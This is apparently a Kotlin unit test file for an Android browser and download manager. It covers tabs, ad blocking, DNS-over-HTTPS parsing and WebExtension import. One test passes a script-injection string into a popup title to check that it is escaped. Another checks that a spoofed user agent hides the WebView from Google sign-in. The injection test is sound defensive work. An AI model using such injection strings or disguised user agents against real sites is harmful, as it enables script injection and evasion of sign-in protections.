package com.example

import android.content.Context
import android.os.Vibrator
import android.view.View
import androidx.test.core.app.ApplicationProvider
import com.example.data.adblock.AdBlockerEngine
import com.example.data.browser.BrowserStateRepository
import com.example.data.downloader.DragonDownloadManager
import com.example.data.model.AdBlockerConfig
import com.example.data.model.HapticIntensity
import com.example.data.repository.KernelRepository
import com.example.ui.haptics.DragonHapticsController
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [33])
class BrowserAndDdmTest {

    @Test
    fun testDefaultHomepageAndOmniboxUrlResolution() {
        assertEquals("https://www.google.com", BrowserStateRepository.DEFAULT_HOME_URL)
        assertEquals(
            "https://www.google.com",
            BrowserStateRepository.resolveBrowserInputToUrl("")
        )
        assertEquals(
            "https://patreon.com/user",
            BrowserStateRepository.resolveBrowserInputToUrl("patreon.com/user")
        )
        assertEquals(
            "http://example.org/file.zip",
            BrowserStateRepository.resolveBrowserInputToUrl("http://example.org/file.zip")
        )
        assertEquals(
            "https://www.google.com/search?q=dragon+tools+apk",
            BrowserStateRepository.resolveBrowserInputToUrl("dragon tools apk")
        )
    }

    @Test
    fun testDragonToolDirectoryConstantsAndSubfolders() {
        assertEquals("DDM", DragonDownloadManager.DRAGON_TOOL_ROOT_FOLDER)
        assertEquals("Download/DDM", DragonDownloadManager.DRAGON_TOOL_DISPLAY_PATH)
        assertEquals(
            "DDM/Video",
            DragonDownloadManager.subFolderForType(isAudioOnly = false, isGenericFile = false)
        )
        assertEquals(
            "DDM/Audio",
            DragonDownloadManager.subFolderForType(isAudioOnly = true, isGenericFile = false)
        )
        assertEquals(
            "DDM/Program",
            DragonDownloadManager.subFolderForType(extension = "apk", mimeType = "application/vnd.android.package-archive")
        )
        assertEquals(
            "DDM/Compressed",
            DragonDownloadManager.subFolderForType(extension = "zip", mimeType = "application/zip")
        )
        assertEquals(
            "DDM/Document",
            DragonDownloadManager.subFolderForType(extension = "pdf", mimeType = "application/pdf")
        )
        assertEquals(
            "DDM/Photo",
            DragonDownloadManager.subFolderForType(extension = "jpg", mimeType = "image/jpeg")
        )
        assertEquals(
            "DDM/Subtitle",
            DragonDownloadManager.subFolderForType(extension = "srt", mimeType = "application/x-subrip")
        )
        assertEquals(
            "DDM/Torrent",
            DragonDownloadManager.subFolderForType(extension = "torrent", url = "magnet:?xt=urn:btih:1234567890abcdef1234567890abcdef12345678")
        )

        val magnetInfo = com.example.data.downloader.TorrentEngine.parseMagnetUri("magnet:?xt=urn:btih:1234567890abcdef1234567890abcdef12345678&dn=Ubuntu+ISO")
        assertEquals("Ubuntu ISO", magnetInfo.displayName)
        assertEquals("1234567890abcdef1234567890abcdef12345678", magnetInfo.infoHashHex)
    }

    @Test
    fun testBrowserRepositoryTabsHistoryIncognitoAndBookmarks() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val repo = BrowserStateRepository(context)
        repo.clearHistory()

        // Default initial tab points to google.com
        val initialTab = repo.getActiveTab()
        assertEquals("https://www.google.com", initialTab.url)
        assertFalse(initialTab.isIncognito)

        // Normal visit is recorded in history
        repo.recordVisit("https://example.org/video", "Sample Video", isIncognito = false)
        assertTrue(repo.historyFlow.value.any { it.url == "https://example.org/video" })

        // Incognito tab opens & does NOT record history
        val incognitoTab = repo.openNewTab(isIncognito = true)
        assertTrue(incognitoTab.isIncognito)
        repo.recordVisit("https://secret.example.org/private", "Private Page", isIncognito = true)
        assertFalse(repo.historyFlow.value.any { it.url == "https://secret.example.org/private" })

        // Closing last incognito tab returns true
        assertTrue(repo.closeTab(incognitoTab.id))

        // Bookmarks toggle works cleanly
        assertTrue(repo.toggleBookmark("https://bilibili.tv/video/123", "Bilibili Clip"))
        assertTrue(repo.isBookmarked("https://bilibili.tv/video/123"))
        assertFalse(repo.toggleBookmark("https://bilibili.tv/video/123", "Bilibili Clip"))
        assertFalse(repo.isBookmarked("https://bilibili.tv/video/123"))
    }

    @Test
    fun testBrowserAdBlockerFiltersAdsWhilePreservingGoogleSearch() {
        val enabledCfg = AdBlockerConfig(isGlobalEnabled = true)
        assertTrue(
            AdBlockerEngine.isBrowserUrlBlocked(
                "https://googleads.g.doubleclick.net/pagead/id",
                enabledCfg
            )
        )
        assertTrue(
            AdBlockerEngine.isBrowserUrlBlocked(
                "https://adservice.google.com/adsid/integrator.js",
                enabledCfg
            )
        )
        assertTrue(
            AdBlockerEngine.isBrowserUrlBlocked(
                "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",
                enabledCfg
            )
        )
        assertFalse(
            AdBlockerEngine.isBrowserUrlBlocked(
                "https://www.google.com/search?q=pubg+mobile",
                enabledCfg
            )
        )
        assertFalse(
            AdBlockerEngine.isBrowserUrlBlocked(
                "https://googleads.g.doubleclick.net/pagead/id",
                AdBlockerConfig(isGlobalEnabled = false)
            )
        )
    }

    @Test
    fun testKernelRepositoryTelemetryMutexAndTickDoesNotThrowNpe() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val repo = KernelRepository.getInstance(context)
        runBlocking {
            repo.tickTelemetryAndWait(force = true)
            repo.tickTelemetryAndWait(force = false)
        }
        assertTrue(repo.batteryFlow.value.levelPercent in 0..100)
    }

    @Test
    fun testKernelRepositoryHapticPreferencesPersistence() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val repo = KernelRepository.getInstance(context)
        val prefs = context.getSharedPreferences("dragon_theme_style_prefs", Context.MODE_PRIVATE)

        repo.setHapticFeedbackEnabled(false)
        assertFalse(repo.themeConfigFlow.value.hapticFeedbackEnabled)
        assertFalse(prefs.getBoolean("haptic_feedback_enabled", true))

        repo.setHapticIntensity(HapticIntensity.CRISP)
        assertTrue(repo.themeConfigFlow.value.hapticFeedbackEnabled)
        assertEquals(HapticIntensity.CRISP, repo.themeConfigFlow.value.hapticIntensity)
        assertTrue(prefs.getBoolean("haptic_feedback_enabled", false))
        assertEquals(HapticIntensity.CRISP.name, prefs.getString("haptic_intensity", null))

        repo.setHapticIntensity(HapticIntensity.SUBTLE)
        assertEquals(HapticIntensity.SUBTLE, repo.themeConfigFlow.value.hapticIntensity)
        assertEquals(HapticIntensity.SUBTLE.name, prefs.getString("haptic_intensity", null))

        // Restore balanced default
        repo.setHapticIntensity(HapticIntensity.BALANCED)
        assertEquals(HapticIntensity.BALANCED, repo.themeConfigFlow.value.hapticIntensity)
    }

    @Test
    fun testDragonHapticsControllerExecutesAllFeedbackMethodsSafely() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val view = View(context)
        @Suppress("DEPRECATION")
        val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator

        val controllers = listOf(
            DragonHapticsController.NoOp,
            DragonHapticsController(
                enabled = false,
                intensity = HapticIntensity.BALANCED,
                view = view,
                composeHaptics = null,
                vibrator = vibrator
            ),
            DragonHapticsController(
                enabled = true,
                intensity = HapticIntensity.SUBTLE,
                view = view,
                composeHaptics = null,
                vibrator = vibrator
            ),
            DragonHapticsController(
                enabled = true,
                intensity = HapticIntensity.BALANCED,
                view = view,
                composeHaptics = null,
                vibrator = vibrator
            ),
            DragonHapticsController(
                enabled = true,
                intensity = HapticIntensity.CRISP,
                view = view,
                composeHaptics = null,
                vibrator = vibrator
            )
        )

        controllers.forEach { haptics ->
            haptics.tap()
            haptics.tabSelect()
            haptics.toggle(true)
            haptics.toggle(false)
            haptics.confirm()
            haptics.heavyAction()
            haptics.warning()
            haptics.sliderTick()
        }
        assertTrue(true)
    }

    @Test
    fun testCloudflareWarpDnsAndDownloaderTogglePersistence() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val prefs = context.getSharedPreferences("dragon_universal_downloader", Context.MODE_PRIVATE)
        prefs.edit().clear().commit()

        val scope = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Unconfined)
        val dm = DragonDownloadManager(context = context, scope = scope, onFeedback = {})

        // Default is OFF (false) for Cloudflare WARP DNS
        assertFalse(dm.warpDnsEnabledFlow.value)
        assertFalse(dm.warpDns.isEnabled)

        // Toggle ON via toggleWarpDns()
        val toggledOn = dm.toggleWarpDns()
        assertTrue(toggledOn)
        assertTrue(dm.warpDnsEnabledFlow.value)
        assertTrue(dm.warpDns.isEnabled)
        assertTrue(prefs.getBoolean("cloudflare_warp_dns_enabled_v2", false))

        // Toggle OFF
        dm.setWarpDnsEnabled(false)
        assertFalse(dm.warpDnsEnabledFlow.value)
        assertFalse(dm.warpDns.isEnabled)
        assertFalse(dm.warpDns.isAnyCustomDnsActive)

        // Verify separate notification group keys between Main App Notification Panel and Download Notification Panel
        assertTrue(
            com.example.service.DragonMonitorService.GROUP_MAIN_TELEMETRY_HUD !=
                com.example.data.downloader.DownloadNotificationController.GROUP_DOWNLOAD_CONTROL_HUD
        )

        // Verify Cloudflare DoH JSON parser preserves hostname for TLS SNI
        val sampleDohJson = """
            {
              "Status": 0,
              "Answer": [
                { "name": "cdn.example.org.", "type": 1, "TTL": 240, "data": "104.16.132.229" },
                { "name": "cdn.example.org.", "type": 1, "TTL": 180, "data": "104.16.133.229" }
              ]
            }
        """.trimIndent()
        val parsed = com.example.data.downloader.CloudflareWarpDns.parseDohJsonResponse("cdn.example.org", sampleDohJson)
        assertTrue(parsed != null)
        assertEquals(2, parsed!!.first.size)
        assertEquals("cdn.example.org", parsed.first[0].hostName)
        assertEquals("104.16.132.229", parsed.first[0].hostAddress)
        assertEquals(180L, parsed.second)

        // Verify non-blocking prewarmHostAsync, package name com.android.ddm & App Version 2.3
        dm.warpDns.prewarmHostAsync("www.google.com")
        assertEquals("2.3", BuildConfig.VERSION_NAME)
        assertEquals(23, BuildConfig.VERSION_CODE)
        assertEquals("com.android.ddm", BuildConfig.APPLICATION_ID)
    }

    @Test
    fun testBrowserExtensionImportExecutionAndExitClosesAllTabs() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val repo = BrowserStateRepository(context)
        val engine = repo.extensionEngine

        // 1. Verify built-in extensions are loaded and URL matching works
        assertTrue(engine.extensionsFlow.value.isNotEmpty())
        assertTrue(engine.matchesUrlPattern("https://www.youtube.com/watch?v=123", listOf("*://*.youtube.com/*")))
        assertFalse(engine.matchesUrlPattern("https://www.google.com/search?q=test", listOf("*://*.youtube.com/*")))

        // 2. Build an in-memory .zip WebExtension (MV3) with manifest.json, content.js, style.css, popup.html, and DNR rules.json
        val zipBytes = java.io.ByteArrayOutputStream().use { baos ->
            java.util.zip.ZipOutputStream(baos).use { zos ->
                fun addEntry(name: String, text: String) {
                    zos.putNextEntry(java.util.zip.ZipEntry(name))
                    zos.write(text.toByteArray(Charsets.UTF_8))
                    zos.closeEntry()
                }
                addEntry(
                    "manifest.json",
                    """
                    {
                      "manifest_version": 3,
                      "name": "Dragon Test Enhancer",
                      "version": "2.4.1",
                      "description": "Test MV3 WebExtension with content scripts, popup, and DNR",
                      "permissions": ["storage", "activeTab", "declarativeNetRequest"],
                      "host_permissions": ["*://*.example.com/*"],
                      "action": { "default_popup": "popup.html" },
                      "content_scripts": [
                        {
                          "matches": ["*://*.example.com/*"],
                          "js": ["content.js"],
                          "css": ["style.css"],
                          "run_at": "document_end"
                        }
                      ],
                      "declarative_net_request": {
                        "rule_resources": [
                          { "id": "ruleset_1", "enabled": true, "path": "rules.json" }
                        ]
                      }
                    }
                    """.trimIndent()
                )
                addEntry("content.js", "chrome.storage.local.set({ visited: true }); console.log('DragonExt Loaded');")
                addEntry("style.css", "body { border-top: 2px solid #00E5FF !important; }")
                addEntry("popup.html", "<html><head><title>Popup</title></head><body><h1>Dragon Extension Popup</h1></body></html>")
                addEntry(
                    "rules.json",
                    """
                    [
                      {
                        "id": 1,
                        "priority": 1,
                        "action": { "type": "block" },
                        "condition": { "urlFilter": "||ads-tracker.example.net^" }
                      }
                    ]
                    """.trimIndent()
                )
            }
            baos.toByteArray()
        }

        val importedZipExt = engine.importExtensionFromBytes("dragon-enhancer.zip", zipBytes).getOrThrow()
        assertEquals("Dragon Test Enhancer", importedZipExt.name)
        assertEquals("2.4.1", importedZipExt.version)
        assertEquals("popup.html", importedZipExt.popupPath)
        assertEquals(1, importedZipExt.netRules.size)

        // 3. Test CRX3 header unwrapping (Cr24 magic prefix + header before ZIP bytes)
        val crxPrefix = "Cr24".toByteArray(Charsets.US_ASCII) + ByteArray(24) { 0 }
        val crxBytes = crxPrefix + zipBytes
        val importedCrxExt = engine.importExtensionFromBytes("dragon-enhancer.crx", crxBytes).getOrThrow()
        assertEquals("Dragon Test Enhancer", importedCrxExt.name)

        // 4. Test Userscript (.user.js) import with ==UserScript== header
        val userscriptText = """
            // ==UserScript==
            // @name         YouTube HD Auto-Selector
            // @version      1.5.0
            // @description  Automatically selects highest video resolution
            // @match        *://*.youtube.com/*
            // @run-at       document-start
            // ==/UserScript==
            GM_setValue('hd_enabled', true);
        """.trimIndent()
        val importedUserScript = engine.importExtensionFromBytes("yt-hd.user.js", userscriptText.toByteArray(Charsets.UTF_8)).getOrThrow()
        assertEquals("YouTube HD Auto-Selector", importedUserScript.name)
        assertEquals("1.5.0", importedUserScript.version)

        // 5. Verify injection payload for matching URLs vs non-matching URLs
        val payloadStartYt = engine.buildInjectionPayloadForUrl("https://www.youtube.com/watch?v=abc", "document_start")
        assertTrue(payloadStartYt.contains("GM_setValue('hd_enabled', true)"))

        val payloadEndExample = engine.buildInjectionPayloadForUrl("https://sub.example.com/index.html", "document_end")
        assertTrue(payloadEndExample.contains("DragonExt Loaded"))
        assertTrue(payloadEndExample.contains("#00E5FF"))

        // 6. Verify web-accessible resource serving & DNR blocking in interceptExtensionRequest
        val popupRes = engine.interceptExtensionRequest(
            requestUrl = "https://dragon-ext.local/${importedZipExt.id}/popup.html",
            pageHost = "sub.example.com",
            isMainFrame = false
        )
        assertTrue(popupRes != null)
        assertEquals("text/html", popupRes!!.mimeType)

        val blockedTrackerRes = engine.interceptExtensionRequest(
            requestUrl = "https://ads-tracker.example.net/pixel.js",
            pageHost = "sub.example.com",
            isMainFrame = false
        )
        assertTrue(blockedTrackerRes != null)

        // 7. Verify extension persistent KV storage round-trip
        engine.mergeExtensionStorageJson(importedZipExt.id, """{"theme":"cyberpunk","count":5}""")
        val storedJson = engine.getExtensionStorageJson(importedZipExt.id)
        assertTrue(storedJson.contains("cyberpunk"))

        // 8. Verify Exit Browser closeAllTabs() closes all open normal & incognito tabs automatically
        repo.openNewTab("https://example.com/1", isIncognito = false)
        repo.openNewTab("https://example.com/2", isIncognito = true)
        assertTrue(repo.tabsFlow.value.size >= 3)
        repo.closeAllTabs()
        assertEquals(1, repo.tabsFlow.value.size)
        assertEquals(BrowserStateRepository.DEFAULT_HOME_URL, repo.tabsFlow.value.first().url)
        assertFalse(repo.tabsFlow.value.first().isIncognito)
    }

    @Test
    fun testBackgroundDownloadService() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val scope = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Unconfined)
        val dm = DragonDownloadManager(context = context, scope = scope, onFeedback = {})
        dm.setWarpDnsEnabled(true)

        // Foreground background-download service state detection & unified notification build
        val sampleFmt = com.example.data.model.MediaFormatOption(
            id = "fmt_1",
            qualityLabel = "1080p",
            container = "mp4",
            mimeType = "video/mp4",
            contentLengthBytes = 10_000_000L,
            isAudioOnly = false,
            streamUrl = "https://example.org/video.mp4"
        )
        val activeTask = com.example.data.model.DownloaderTask(
            id = "task_active_1",
            url = "https://example.org/video",
            title = "Sample Video",
            creator = "Creator",
            filename = "Sample_Video_1080p.mp4",
            thumbnailUrl = "",
            platform = com.example.data.model.MediaPlatform.DIRECT,
            qualityLabel = "1080p",
            container = "mp4",
            mimeType = "video/mp4",
            isAudioOnly = false,
            formatOption = sampleFmt,
            stage = com.example.data.model.DownloadStateStage.DOWNLOADING_VIDEO,
            progress = 0.45f,
            downloadedBytes = 4_500_000L,
            totalBytes = 10_000_000L
        )
        assertTrue(com.example.service.DragonDownloadService.hasActiveWork(listOf(activeTask), null))
        val pausedTask = activeTask.copy(stage = com.example.data.model.DownloadStateStage.PAUSED)
        assertFalse(com.example.service.DragonDownloadService.hasActiveWork(listOf(pausedTask), null))

        val fgNotif = dm.notificationController.buildForegroundDownloadNotification(listOf(activeTask))
        assertEquals(android.app.Notification.CATEGORY_PROGRESS, fgNotif.category)
    }

    @Test
    fun testChromeWebStoreExtractionCrx3UnpackingI18nGlobsDnrAndPopupContext() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val engine = com.example.data.browser.BrowserExtensionEngine(context)

        // 1. Chrome Web Store URL, 32-char ID, & clients2 CRX URL extraction
        val sampleId = "eimadpbcbfnmbkopoojfekhnkhdbieeh" // 32 chars [a-p]
        assertEquals(
            sampleId,
            com.example.data.browser.BrowserExtensionEngine.extractChromeWebStoreId(
                "https://chromewebstore.google.com/detail/dark-reader/$sampleId"
            )
        )
        assertEquals(
            sampleId,
            com.example.data.browser.BrowserExtensionEngine.extractChromeWebStoreId(
                "https://chrome.google.com/webstore/detail/dark-reader/$sampleId?hl=en"
            )
        )
        assertEquals(
            sampleId,
            com.example.data.browser.BrowserExtensionEngine.extractChromeWebStoreId(sampleId)
        )
        assertTrue(
            com.example.data.browser.BrowserExtensionEngine.isChromeWebStoreDetailUrl(
                "https://chromewebstore.google.com/detail/dark-reader/$sampleId"
            )
        )
        assertFalse(
            com.example.data.browser.BrowserExtensionEngine.isChromeWebStoreDetailUrl(
                "https://chromewebstore.google.com/category/extensions"
            )
        )
        val crxUrl = com.example.data.browser.BrowserExtensionEngine.buildChromeWebStoreCrxDownloadUrl(sampleId)
        assertTrue(com.example.data.browser.BrowserExtensionEngine.isChromeWebStoreCrxUrl(crxUrl))
        assertEquals(sampleId, com.example.data.browser.BrowserExtensionEngine.extractChromeWebStoreId(crxUrl))

        // 2. Build ZIP with _locales/en/messages.json, include_globs, exclude_globs, :port matches, multi-domain DNR, & popup.html
        val zipBytes = java.io.ByteArrayOutputStream().use { baos ->
            java.util.zip.ZipOutputStream(baos).use { zos ->
                fun addEntry(name: String, text: String) {
                    zos.putNextEntry(java.util.zip.ZipEntry(name))
                    zos.write(text.toByteArray(Charsets.UTF_8))
                    zos.closeEntry()
                }
                addEntry(
                    "_locales/en/messages.json",
                    """
                    {
                      "extName": { "message": "CWS Locale Enhancer" },
                      "extDesc": { "message": "Localized Store Description" },
                      "greeting": { "message": "Hello ${'$'}1 from Store" }
                    }
                    """.trimIndent()
                )
                addEntry(
                    "manifest.json",
                    """
                    {
                      "manifest_version": 3,
                      "default_locale": "en",
                      "name": "__MSG_extName__",
                      "version": "4.9.1",
                      "description": "__MSG_extDesc__",
                      "permissions": ["storage", "activeTab", "scripting", "declarativeNetRequest"],
                      "action": { "default_popup": "popup.html" },
                      "content_scripts": [
                        {
                          "matches": ["http*://*.example.org:8080/*"],
                          "include_globs": ["*/article/*"],
                          "exclude_globs": ["*admin=1*"],
                          "js": ["content.js"],
                          "run_at": "document_end"
                        }
                      ],
                      "declarative_net_request": {
                        "rule_resources": [
                          { "id": "rules", "enabled": true, "path": "rules.json" }
                        ]
                      }
                    }
                    """.trimIndent()
                )
                addEntry("content.js", "console.log(chrome.i18n.getMessage('greeting', ['World']));")
                addEntry("popup.html", "<html><head></head><body><div id='app'>Popup</div></body></html>")
                addEntry(
                    "rules.json",
                    """
                    [
                      {
                        "id": 10,
                        "action": { "type": "block" },
                        "condition": {
                          "requestDomains": ["tracker-one.net", "tracker-two.org"],
                          "excludedInitiatorDomains": ["trusted-host.com"]
                        }
                      }
                    ]
                    """.trimIndent()
                )
            }
            baos.toByteArray()
        }

        // Wrap inside an exact CRX3 binary header (Cr24 + version=3 LE + headerSize=32 LE + fake protobuf)
        val headerSize = 32
        val crx3Header = ByteArray(12 + headerSize).apply {
            this[0] = 'C'.code.toByte()
            this[1] = 'r'.code.toByte()
            this[2] = '2'.code.toByte()
            this[3] = '4'.code.toByte()
            this[4] = 3 // CRX version 3
            this[8] = headerSize.toByte() // LE uint32 header size = 32
            // Put decoy PK\x03\x04 inside protobuf header bytes to confirm exact header offset skips it!
            this[16] = 0x50
            this[17] = 0x4B
            this[18] = 0x03
            this[19] = 0x04
        }
        val crx3Bytes = crx3Header + zipBytes

        val imported = engine.importExtensionFromBytes(
            fileName = "$sampleId.crx",
            rawBytes = crx3Bytes,
            storeIdOverride = sampleId
        ).getOrThrow()

        assertEquals("CWS Locale Enhancer", imported.name)
        assertEquals("Localized Store Description", imported.description)
        assertEquals(sampleId, imported.storeId)
        assertTrue(engine.isInstalledFromStoreId(sampleId))

        // 3. Verify http* + :port + include_globs/exclude_globs matching & i18n payload injection
        val matchPayload = engine.buildInjectionPayloadForUrl(
            "https://news.example.org:8080/article/hello",
            "document_end"
        )
        assertTrue(matchPayload.contains("Hello \$1 from Store"))
        assertTrue(matchPayload.contains("chrome.i18n.getMessage"))

        val excludedGlobPayload = engine.buildInjectionPayloadForUrl(
            "https://news.example.org:8080/article/hello?admin=1",
            "document_end"
        )
        assertFalse(excludedGlobPayload.contains("chrome.i18n.getMessage('greeting'"))

        val wrongPortPayload = engine.buildInjectionPayloadForUrl(
            "https://news.example.org:9090/article/hello",
            "document_end"
        )
        assertFalse(wrongPortPayload.contains("chrome.i18n.getMessage('greeting'"))

        // 4. Verify multi-domain requestDomains DNR blocking & excludedInitiatorDomains exemption
        val blockedDomain2 = engine.interceptExtensionRequest(
            requestUrl = "https://sub.tracker-two.org/beacon.js",
            pageHost = "news.example.org",
            isMainFrame = false
        )
        assertTrue(blockedDomain2 != null)

        val exemptedSite = engine.interceptExtensionRequest(
            requestUrl = "https://sub.tracker-two.org/beacon.js",
            pageHost = "trusted-host.com",
            isMainFrame = false
        )
        assertEquals(null, exemptedSite)

        // 5. Verify popup HTML receives active browser tab URL & title context
        val popupPair = engine.loadExtensionPopupHtml(
            ext = imported,
            activeTabUrl = "https://news.example.org:8080/article/hello",
            activeTabTitle = "Target News Article"
        )
        assertTrue(popupPair != null)
        val normalizedPopupHtml = popupPair!!.second.replace("\\/", "/")
        assertTrue(normalizedPopupHtml.contains("https://news.example.org:8080/article/hello"))
        assertTrue(normalizedPopupHtml.contains("Target News Article"))
    }

    @Test
    fun testExtensionPopupVirtualOriginOptionsFallbackAndRootAssets() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val engine = com.example.data.browser.BrowserExtensionEngine(context)

        val zipBytes = java.io.ByteArrayOutputStream().use { baos ->
            java.util.zip.ZipOutputStream(baos).use { zos ->
                fun addEntry(name: String, content: String) {
                    zos.putNextEntry(java.util.zip.ZipEntry(name))
                    zos.write(content.toByteArray(Charsets.UTF_8))
                    zos.closeEntry()
                }
                addEntry(
                    "_locales/en/messages.json",
                    """
                    {
                      "panelTitle": { "message": "Tweak Controls" },
                      "accentHex": { "message": "#00E5FF" }
                    }
                    """.trimIndent()
                )
                addEntry(
                    "manifest.json",
                    """
                    {
                      "manifest_version": 3,
                      "name": "Options Tweak Ext",
                      "version": "2.0.0",
                      "default_locale": "en",
                      "options_ui": { "page": "./ui/options.html?tab=general" }
                    }
                    """.trimIndent()
                )
                addEntry(
                    "ui/options.html",
                    "<html><head><link rel='stylesheet' href='/assets/theme.css'></head><body><h1>__MSG_panelTitle__</h1><script src='/assets/app.js'></script></body></html>"
                )
                addEntry("assets/theme.css", ":root { --accent: __MSG_accentHex__; }")
                addEntry("assets/app.js", "console.log('</script> safe', chrome.windows.WINDOW_ID_CURRENT);")
            }
            baos.toByteArray()
        }

        val imported = engine.importExtensionFromBytes(
            fileName = "options_tweak_test.zip",
            rawBytes = zipBytes
        ).getOrThrow()

        // options_ui.page should be normalized as popupPath fallback
        assertEquals("ui/options.html?tab=general", imported.popupPath)

        val (baseUrl, html) = engine.loadExtensionPopupHtml(
            ext = imported,
            activeTabUrl = "https://example.com",
            activeTabTitle = "Example </script><script>alert(1)</script>"
        )!!
        val expectedHost = com.example.data.browser.BrowserExtensionEngine.extensionVirtualHost(imported.id)
        assertTrue(baseUrl.startsWith("https://$expectedHost/ui/options.html"))
        assertTrue(html.contains("Tweak Controls"))
        assertTrue(html.contains("windows:") && html.contains("WINDOW_ID_CURRENT"))
        assertTrue(html.contains("window.chrome = scope.chrome"))
        assertFalse(html.contains("Example </script>"))
        assertTrue(html.contains("Example <\\/script>"))

        // Root-relative CSS fetched from extension origin should resolve & substitute __MSG_*__
        val cssResp = engine.interceptExtensionRequest(
            requestUrl = "https://$expectedHost/assets/theme.css",
            pageHost = expectedHost,
            isMainFrame = false,
            fallbackExtId = imported.id
        )
        assertTrue(cssResp != null)
        assertEquals("text/css", cssResp!!.mimeType)
        val cssText = cssResp.data.bufferedReader().use { it.readText() }
        assertTrue(cssText.contains("#00E5FF"))

        // Fallback lookup when fallbackExtId is supplied even on bare path-style origin
        val jsResp = engine.interceptExtensionRequest(
            requestUrl = "https://dragon-ext.local/assets/app.js",
            pageHost = "dragon-ext.local",
            isMainFrame = false,
            fallbackExtId = imported.id
        )
        assertTrue(jsResp != null)
        assertEquals("application/javascript", jsResp!!.mimeType)
    }

    @Test
    fun testGoogleSignInProtectionAndCleanUserAgent() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val engine = com.example.data.browser.BrowserExtensionEngine(context)

        val rawWebViewUa =
            "Mozilla/5.0 (Linux; Android 14; Pixel 8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/135.0.7049.111 Mobile Safari/537.36"
        val cleanMobileUa = com.example.ui.screens.buildGoogleSignInCompatibleUserAgent(rawWebViewUa, desktopMode = false)
        assertFalse(cleanMobileUa.contains("; wv"))
        assertFalse(cleanMobileUa.contains("Version/4.0"))
        assertTrue(cleanMobileUa.contains("Chrome/135.0.7049.111"))

        val cleanDesktopUa = com.example.ui.screens.buildGoogleSignInCompatibleUserAgent(rawWebViewUa, desktopMode = true)
        assertTrue(cleanDesktopUa.contains("X11; Linux x86_64"))
        assertTrue(cleanDesktopUa.contains("Chrome/135.0.7049.111"))

        // Protected auth hosts skip extension content script injection and WARP request tunneling
        assertTrue(com.example.data.browser.BrowserExtensionEngine.isProtectedAuthUrl("https://accounts.google.com/v3/signin"))
        assertTrue(com.example.data.browser.BrowserExtensionEngine.isProtectedAuthUrl("https://myaccount.google.com/security"))
        assertEquals("", engine.buildInjectionPayloadForUrl("https://accounts.google.com/v3/signin", "document_end"))

        val warp = com.example.data.downloader.CloudflareWarpDns(initialEnabled = true)
        assertTrue(com.example.data.downloader.CloudflareWarpDns.isAuthOrSessionCriticalHost("accounts.google.com"))
        assertFalse(
            warp.shouldTunnelBrowserRequest(
                hostname = "accounts.google.com",
                method = "GET",
                requestHeaders = mapOf("Accept" to "text/html")
            )
        )
    }

    @Test
    fun testHeatingOptimizationThrottlesAndNoPollingInterval() {
        assertTrue(com.example.data.downloader.IdmAcceleratedDownloader.REPORT_INTERVAL_MS >= 300L)
        assertTrue(com.example.data.downloader.DownloadNotificationController.PROGRESS_THROTTLE_MS >= 700L)

        val context = ApplicationProvider.getApplicationContext<Context>()
        val engine = com.example.data.browser.BrowserExtensionEngine(context)
        val speedHud = engine.extensionsFlow.value.firstOrNull { it.id == "builtin_video_speed_hud" }
        assertTrue(speedHud != null)
        val script = speedHud!!.contentScripts.firstOrNull()?.inlineJs.orEmpty()
        assertFalse(script.contains("setInterval("))
    }

    @Test
    fun testInstantLaunchResourcesAndClearCookiesHelper() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        // Transparent splash drawable & dark launch background color must exist to suppress opening logo
        assertTrue(R.drawable.ic_splash_transparent != 0)
        assertTrue(R.color.dragon_launch_bg != 0)

        // ensurePersistedTasksLoaded is safe and idempotent
        val scope = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Unconfined)
        val dm = DragonDownloadManager(context = context, scope = scope, onFeedback = {})
        dm.ensurePersistedTasksLoaded()
        dm.ensurePersistedTasksLoaded()

        // clearAllBrowserCookies completes safely without throwing under Robolectric
        com.example.ui.screens.clearAllBrowserCookies()
        assertTrue(true)
    }

    @Test
    fun testExtensionPopupMv3BackgroundRunnerCspStripAndPolyfillOrder() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val engine = com.example.data.browser.BrowserExtensionEngine(context)

        val zipBytes = java.io.ByteArrayOutputStream().use { baos ->
            java.util.zip.ZipOutputStream(baos).use { zos ->
                fun addEntry(name: String, content: String) {
                    zos.putNextEntry(java.util.zip.ZipEntry(name))
                    zos.write(content.toByteArray(Charsets.UTF_8))
                    zos.closeEntry()
                }
                addEntry(
                    "manifest.json",
                    """
                    {
                      "manifest_version": 3,
                      "name": "MV3 Panel Extension",
                      "version": "1.2.3",
                      "action": { "default_popup": "index.html" },
                      "background": { "service_worker": "bg.js", "type": "module" }
                    }
                    """.trimIndent()
                )
                addEntry(
                    "index.html",
                    """
                    <!DOCTYPE html>
                    <html>
                    <head>
                      <meta http-equiv="Content-Security-Policy" content="script-src 'self';">
                      <title>Settings</title>
                    </head>
                    <body><div id="root"></div><script type="module" src="popup.js"></script></body>
                    </html>
                    """.trimIndent()
                )
                addEntry("popup.js", "export const ok = true;")
                addEntry("bg.js", "chrome.runtime.onMessage.addListener((m, s, r) => r({ ok: true }));")
            }
            baos.toByteArray()
        }

        val imported = engine.importExtensionFromBytes(
            fileName = "mv3_panel_ext.zip",
            rawBytes = zipBytes
        ).getOrThrow()

        assertEquals("index.html", imported.popupPath)
        assertEquals("bg.js", imported.backgroundScriptPath)

        val extHost = com.example.data.browser.BrowserExtensionEngine.extensionVirtualHost(imported.id)
